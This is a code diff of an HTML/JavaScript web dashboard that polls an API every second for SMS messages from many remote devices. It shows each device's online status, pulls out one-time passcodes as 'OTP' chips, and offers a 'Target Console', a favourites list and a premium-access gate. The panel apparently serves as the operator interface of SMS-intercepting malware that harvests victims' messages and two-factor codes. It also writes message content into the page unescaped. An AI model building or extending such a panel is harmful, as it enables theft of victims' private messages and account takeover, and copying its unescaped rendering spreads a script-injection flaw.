- .slice(0,20);
-   const nextIds=getSmsIds(sms);
-   const hasNew=hasNewSms(prevIds, nextIds);
-   if(currentSmsDevice===deviceId && (!manual || hasNew || showLoading || prevIds.length===0)) renderSmsForDevice(device, sms);
-   if(manual) showToast(hasNew ? 'SMS received' : 'No SMS received', hasNew ? 'ok' : 'info');
- }catch(e){
-   if(showLoading) document.getElementById('smsList').innerHTML='Failed to load SMS';
-   if(manual) showToast('Refresh failed', 'info');
- }finally{
-   isSmsRefreshing=false;
-   if(btn) btn.disabled=false;
- }
+  const sms=mergedMsgs.filter(m=>m.device_id===deviceId || m.source_id===deviceId).sort((a,b)=> getMsgTime(b)-getMsgTime(a)).slice(0,20);
+  const nextIds=getSmsIds(sms); const hasNew=hasNewSms(prevIds, nextIds);
+  if(currentSmsDevice===deviceId && (!manual || hasNew || showLoading || prevIds.length===0)) renderSmsForDevice(device, sms);
+  if(manual) showToast(hasNew ? 'SMS received' : 'No SMS received', hasNew ? 'ok' : 'info');
+ }catch(e){ if(showLoading) document.getElementById('smsList').innerHTML='Failed to load SMS'; if(manual) showToast('Refresh failed', 'info'); }finally{ isSmsRefreshing=false; if(btn) btn.disabled=false; }
 }
 
-async function openSms(deviceId){
- currentSmsDevice=deviceId;
- currentSmsIds=[];
- document.getElementById('smsModal').style.display='block';
-
- const device=allDevices.find(x=>x.id===deviceId) || {id:deviceId};
- const cached=(recentSmsByDevice[deviceId]||[])
- .sort((a,b)=>getMsgTime(b)-getMsgTime(a))
- .slice(0,20);
-
- renderSmsForDevice(device,cached);
-
- refreshOpenSms(false);
-}
-
-function manualRefreshSms(){
- refreshOpenSms(false, true);
-}
-
+window.openSms = async function(deviceId){ currentSmsDevice=deviceId; currentSmsIds=[]; document.getElementById('smsModal').style.display='block'; window.switchModalTab('logs'); const device=allDevices.find(x=>x.id===deviceId) || {id:deviceId}; const cached=(recentSmsByDevice[deviceId]||[]).sort((a,b)=>getMsgTime(b)-getMsgTime(a)).slice(0,20); renderSmsForDevice(device,cached); refreshOpenSms(false); };
+window.manualRefreshSms = function(){ refreshOpenSms(false, true); };
 setInterval(() => refreshOpenSms(false), 1000);
-</script>
 
-<div id="liveSmsModal" class="modal">
- <div class="modal-panel">
-  <div class="modal-top"><button class="back-btn" onclick="closeLiveSms()">Back</button><h3 class="modal-title">Live SMS Feed</h3><button class="refresh-btn" onclick="manualRefreshLiveSms()">Refresh</button></div>
-  <div id="liveSmsList">Syncing SMS...</div>
- </div>
-</div>
-
-<script>
-let liveSeenIds=new Set();
-function closeLiveSms(){document.getElementById('liveSmsModal').style.display='none';}
+window.closeLiveSms = function(){document.getElementById('liveSmsModal').style.display='none';};
 
 function renderLiveCard(s){
-  const device = getLiveDeviceInfo(s.device_id);
-  const status = normalizeStatus(device.status);
-  const statusLabel = status === 'online' ? 'Online' : status === 'offline' ? 'Offline' : (device.status || 'Unknown');
-  const statusClass = status === 'online' ? 'badge-online' : status === 'offline' ? 'badge-offline' : 'badge-other';
-  const phone = getDeviceTitle(device);
-  
-  const devKey = device.id || phone;
-  const favs = JSON.parse(localStorage.getItem('god_favs')||'[]');
-  const isFav = favs.includes(devKey);
-
-  return `<div id="sms_${s.id}" class="sms-card" onclick="openedFromLiveFeed=true;closeLiveSms();openSms('${s.device_id||s.source_id||''}')" style="cursor:pointer">
-    <div class="sms-card-header" style="flex-wrap:wrap;align-items:center;">
-      <div style="min-width:0;">
-        <b>${s.sender||'Unknown'}</b>
-      </div>
-      <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
-        <span class="sms-card-time">${formatMsgDate(s)}</span>
-        <span class="status-pill ${statusClass}">${statusLabel}</span>
-      </div>
-    </div>
-    <div class="sms-card-device">${phone} <button class="copy-btn" onclick="event.stopPropagation();copyText('${phone}',event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div>
-    <div style="font-size:11px;color:var(--muted)">${s.device_id||''}</div>
-    <div class="sms-card-body">${s.body||''}</div>
-    ${s.otp_code ? `<div class="otp-chip">OTP: ${s.otp_code}</div>` : ''}
-  </div>`;
+  const device = getLiveDeviceInfo(s.device_id); const status = normalizeStatus(device.status); const statusLabel = status === 'online' ? 'Online' : status === 'offline' ? 'Offline' : (device.status || 'Unknown'); const statusClass = status === 'online' ? 'badge-online' : status === 'offline' ? 'badge-offline' : 'badge-other'; const phone = getDeviceTitle(device); const devKey = device.id || phone; const isFav = JSON.parse(localStorage.getItem('god_favs')||'[]').includes(devKey);
+  return `<div id="sms_${s.id}" class="sms-card" onclick="openedFromLiveFeed=true; window.closeLiveSms(); window.openSms('${s.device_id||s.source_id||''}')" style="cursor:pointer"><div class="sms-card-header" style="flex-wrap:wrap;align-items:center;"><div style="min-width:0;"><b>${s.sender||'Unknown'}</b></div><div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;"><span class="sms-card-time">${formatMsgDate(s)}</span><span class="status-pill ${statusClass}">${statusLabel}</span></div></div><div class="sms-card-device">${phone} <button class="copy-btn" onclick="event.stopPropagation();window.copyText('${phone}',event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn ${isFav ? 'starred' : ''}" onclick="event.stopPropagation();window.toggleFav('${devKey}', this)"><svg viewBox="0 0 24 24"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon></svg></button></div><div style="font-size:11px;color:var(--muted)">${s.device_id||''}</div><div class="sms-card-body">${s.body||''}</div>${s.otp_code ? `<div class="otp-chip">OTP: ${s.otp_code}</div>` : ''}</div>`;
 }
 
 async function pollLiveFeed(){
-  if(document.getElementById('liveSmsModal').style.display==='none') return;
-  try{
-    const res=await fetch(API_URL+'&_t='+Date.now(),{cache:'no-store'});
-    const data=await res.json();
-    latestLiveDevices = data.devices || [];
-    buildLatestSmsMap(data.messages||[]);
-
-    const sms=(data.messages||[])
-      .sort((a,b)=>getMsgTime(b)-getMsgTime(a))
-      .slice(0,50);
-
-    const list=document.getElementById('liveSmsList');
-    list.innerHTML = sms.length
-      ? sms.map(renderLiveCard).join('')
-      : '<div class="empty">No SMS found</div>';
-
-    liveSeenIds = new Set(sms.map(x=>x.id));
-  }catch(e){
-    console.warn('Live feed poll failed', e);
-  }
+  if(document.getElementById('liveSmsModal').style.display==='none' || !window.checkPremium()) return;
+  try{ const res=await fetch(API_URL+'&_t='+Date.now(),{cache:'no-store'}); const data=await res.json(); latestLiveDevices = data.devices || []; const mergedMsgs = [...localFakeSms, ...(data.messages || [])]; buildLatestSmsMap(mergedMsgs); const sms=mergedMsgs.sort((a,b)=>getMsgTime(b)-getMsgTime(a)).slice(0,50);
+    document.getElementById('liveSmsList').innerHTML = sms.length ? sms.map(renderLiveCard).join('') : '<div class="empty">No SMS found</div>'; liveSeenIds = new Set(sms.map(x=>x.id));
+  }catch(e){}
 }
-
-async function openLiveSms(){
-  document.getElementById('liveSmsModal').style.display='block';
-  await pollLiveFeed();
-}
-
-function manualRefreshLiveSms(){
-  pollLiveFeed();
-  showToast('Live feed refreshed', 'ok');
-}
-
-function showTargetConsole(){
-  document.getElementById('homeDashboard').style.display='none';
-  document.querySelector('.summary').style.display='grid';
-  document.querySelector('.search-wrap').style.display='flex';
-  document.querySelector('.filter-tabs').style.display='flex';
-  document.querySelector('.section').style.display='block';
-}
-
-function openStarredFilter() {
-  showTargetConsole();
-  const starTab = document.querySelector('.filter-tab[data-filter="starred"]');
-  if (starTab) setFilter('starred', starTab);
-}
-
-function backToHome(){
-  const hd=document.getElementById('homeDashboard');
-  if(hd) hd.style.display='block';
-  document.querySelector('.summary').style.display='none';
-  document.querySelector('.search-wrap').style.display='none';
-  document.querySelector('.filter-tabs').style.display='none';
-  document.querySelector('.section').style.display='none';
-  updateSummary(allDevices);
-}
-setInterval(()=>pollLiveFeed(),1000);
-
+window.openLiveSms = async function(){ document.getElementById('liveSmsModal').style.display='block'; await pollLiveFeed(); };
+window.manualRefreshLiveSms = function(){ pollLiveFeed(); showToast('Live feed refreshed', 'ok'); };
+window.showTargetConsole = function(){ document.getElementById('homeDashboard').style.display='none'; document.querySelector('.summary').style.display='grid'; document.querySelector('.search-wrap').style.display='flex'; document.querySelector('.filter-tabs').style.display='flex'; document.querySelector('.section').style.display='block'; };
+window.openStarredFilter = function() { window.showTargetConsole(); const starTab = document.querySelector('.filter-tab[data-filter="starred"]'); if (starTab) window.setFilter('starred', starTab); };
+window.backToHome = function(){ const hd=document.getElementById('homeDashboard'); if(hd) hd.style.display='block'; document.querySelector('.summary').style.display='none'; document.querySelector('.search-wrap').style.display='none'; document.querySelector('.filter-tabs').style.display='none'; document.querySelector('.section').style.display='none'; updateSummary(allDevices); };
+setInterval(() => { if(window.checkPremium()) pollLiveFeed(); }, 1000);
 </script>
-
-<script>
-// Better SMS matching and card ordering
-function getLatestSmsForDevice(deviceId,data){
- const msgs=(data.messages||[]).filter(m=>
-   m.device_id===deviceId || m.source_id===deviceId
- ).sort((a,b)=>getMsgOrder(b)-getMsgOrder(a));
- return msgs[0]||null;
-}
-</script>
-
 
 </body>
 </html>
